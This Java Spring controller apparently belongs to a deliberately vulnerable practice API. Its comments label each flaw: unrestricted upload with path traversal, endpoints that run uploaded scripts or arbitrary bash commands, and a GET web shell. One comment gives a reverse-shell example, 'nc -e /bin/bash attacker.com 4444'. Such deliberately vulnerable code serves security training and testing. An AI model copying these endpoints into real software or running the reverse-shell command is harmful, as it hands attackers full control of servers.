package by.tms.publicapi.controller;

import io.swagger.v3.oas.annotations.Operation;
import io.swagger.v3.oas.annotations.Parameter;
import io.swagger.v3.oas.annotations.tags.Tag;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.UUID;

@RestController
@RequestMapping("/api/upload")
@Tag(name = "File Upload", description = "File upload with RCE vulnerability")
public class FileUploadController {

    private static final String UPLOAD_DIR = "/tmp/uploads/";
    private static final String SCRIPTS_DIR = "/tmp/scripts/";

    public FileUploadController() {
        try {
            Files.createDirectories(Paths.get(UPLOAD_DIR));
            Files.createDirectories(Paths.get(SCRIPTS_DIR));
        } catch (IOException e) {
            // Игнорируем ошибки создания
        }
    }

    @PostMapping("/file")
    @Operation(summary = "Upload file (Unrestricted File Upload vulnerability)")
    public ResponseEntity<String> uploadFile(
            @Parameter(description = "File to upload")
            @RequestParam("file") MultipartFile file,
            @Parameter(description = "Custom filename (optional)")
            @RequestParam(required = false) String customName) {

        // УЯЗВИМОСТЬ №1: Нет проверки типа файла
        // Можно загрузить .jsp, .war, исполняемые файлы
        try {
            String filename;
            if (customName != null && !customName.isEmpty()) {
                // УЯЗВИМОСТЬ №2: Path Traversal в имени файла
                filename = customName;
            } else {
                filename = file.getOriginalFilename();
            }

            // УЯЗВИМОСТЬ №3: Сохраняем файл в предсказуемое место
            Path filePath = Paths.get(UPLOAD_DIR + filename);
            Files.createDirectories(filePath.getParent());
            Files.copy(file.getInputStream(), filePath,
                    StandardCopyOption.REPLACE_EXISTING);

            // УЯЗВИМОСТЬ №4: Раскрываем полный путь к файлу
            return ResponseEntity.ok(
                    "File uploaded successfully to: " + filePath.toAbsolutePath()
            );
        } catch (IOException e) {
            return ResponseEntity.badRequest().body("Upload failed: " + e.getMessage());
        }
    }

    @PostMapping("/script")
    @Operation(summary = "Upload and execute script (RCE vulnerability)")
    public ResponseEntity<String> uploadAndExecuteScript(
            @Parameter(description = "Script file to upload and execute")
            @RequestParam("script") MultipartFile script,
            @Parameter(description = "Interpreter to use (bash, python, etc.)")
            @RequestParam(defaultValue = "bash") String interpreter) {

        // УЯЗВИМОСТЬ: Загрузка и выполнение произвольных скриптов
        try {
            // Сохраняем скрипт
            String scriptName = UUID.randomUUID().toString() + ".sh";
            Path scriptPath = Paths.get(SCRIPTS_DIR + scriptName);
            Files.copy(script.getInputStream(), scriptPath,
                    StandardCopyOption.REPLACE_EXISTING);

            // УЯЗВИМОСТЬ: Выполняем скрипт с правами приложения
            scriptPath.toFile().setExecutable(true);

            ProcessBuilder processBuilder = new ProcessBuilder(
                    interpreter, scriptPath.toAbsolutePath().toString()
            );
            processBuilder.directory(new File(SCRIPTS_DIR));

            Process process = processBuilder.start();

            // Читаем вывод
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream())
            );
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            // Читаем ошибки
            BufferedReader errorReader = new BufferedReader(
                    new InputStreamReader(process.getErrorStream())
            );
            StringBuilder errors = new StringBuilder();
            while ((line = errorReader.readLine()) != null) {
                errors.append(line).append("\n");
            }

            process.waitFor();

            return ResponseEntity.ok(
                    "Script executed.\nOutput:\n" + output +
                            "\nErrors:\n" + errors
            );
        } catch (Exception e) {
            return ResponseEntity.badRequest().body(
                    "Script execution failed: " + e.getMessage()
            );
        }
    }

    @PostMapping("/reverse-shell")
    @Operation(summary = "Execute reverse shell (RCE via command injection)")
    public ResponseEntity<String> executeReverseShell(
            @Parameter(description = "Command to execute on server")
            @RequestParam String command) {

        // УЯЗВИМОСТЬ: Прямое выполнение команд ОС
        // Можно выполнить: nc -e /bin/bash attacker.com 4444
        try {
            String[] cmdArray;

            // УЯЗВИМОСТЬ: Разные способы выполнения команд
            if (command.contains("|") || command.contains(";") ||
                    command.contains("&&") || command.contains("||")) {
                // Shell execution
                cmdArray = new String[]{"/bin/bash", "-c", command};
            } else {
                // Direct execution
                cmdArray = command.split(" ");
            }

            ProcessBuilder processBuilder = new ProcessBuilder(cmdArray);
            processBuilder.redirectErrorStream(true);

            Process process = processBuilder.start();

            // Читаем вывод в реальном времени
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream())
            );
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            int exitCode = process.waitFor();

            return ResponseEntity.ok(
                    "Command executed with exit code: " + exitCode +
                            "\nOutput:\n" + output.toString()
            );
        } catch (Exception e) {
            return ResponseEntity.badRequest().body(
                    "Command execution failed: " + e.getMessage()
            );
        }
    }

    @PostMapping("/upload-and-execute")
    @Operation(summary = "Upload file and execute with command (Chained vulnerability)")
    public ResponseEntity<String> uploadAndExecute(
            @Parameter(description = "File to upload")
            @RequestParam("file") MultipartFile file,
            @Parameter(description = "Command to execute with file")
            @RequestParam String execCommand) {

        // УЯЗВИМОСТЬ: Загрузка файла + выполнение команды с путём к файлу
        try {
            // Сохраняем файл
            String filename = file.getOriginalFilename();
            Path filePath = Paths.get(UPLOAD_DIR + filename);
            Files.copy(file.getInputStream(), filePath,
                    StandardCopyOption.REPLACE_EXISTING);

            // УЯЗВИМОСТЬ: Подставляем путь к файлу в команду
            String command = execCommand.replace("{FILE}",
                    filePath.toAbsolutePath().toString());

            ProcessBuilder processBuilder = new ProcessBuilder(
                    "/bin/bash", "-c", command
            );
            processBuilder.redirectErrorStream(true);

            Process process = processBuilder.start();

            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream())
            );
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            process.waitFor();

            return ResponseEntity.ok(
                    "File uploaded to: " + filePath.toAbsolutePath() +
                            "\nCommand: " + command +
                            "\nOutput:\n" + output.toString()
            );
        } catch (Exception e) {
            return ResponseEntity.badRequest().body(
                    "Operation failed: " + e.getMessage()
            );
        }
    }

    @GetMapping("/shell")
    @Operation(summary = "Web shell endpoint (Backdoor vulnerability)")
    public ResponseEntity<String> webShell(
            @Parameter(description = "Command to execute")
            @RequestParam String cmd) {

        // УЯЗВИМОСТЬ: Прямой веб-шелл
        try {
            Process process = Runtime.getRuntime().exec(
                    new String[]{"/bin/bash", "-c", cmd}
            );

            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream())
            );
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            BufferedReader errorReader = new BufferedReader(
                    new InputStreamReader(process.getErrorStream())
            );
            while ((line = errorReader.readLine()) != null) {
                output.append(line).append("\n");
            }

            process.waitFor();
            return ResponseEntity.ok(output.toString());
        } catch (Exception e) {
            return ResponseEntity.ok("Error: " + e.getMessage());
        }
    }

}
